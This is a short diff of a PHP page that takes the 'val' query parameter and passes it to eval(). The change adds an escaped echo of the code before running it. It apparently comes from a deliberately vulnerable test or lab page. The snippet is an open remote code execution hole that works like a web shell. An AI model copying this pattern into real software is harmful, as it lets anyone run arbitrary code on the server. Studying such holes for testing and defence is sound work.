@@ -31,7 +31,9 @@
 <?php
 	if (isset($_GET['val'])) 
 	{
-		eval($_GET['val']);
+		$code = $_GET['val'];
+		echo "Executing ", htmlentities($code), "<br/>\n";
+		eval($code);
 	}
 ?>
 
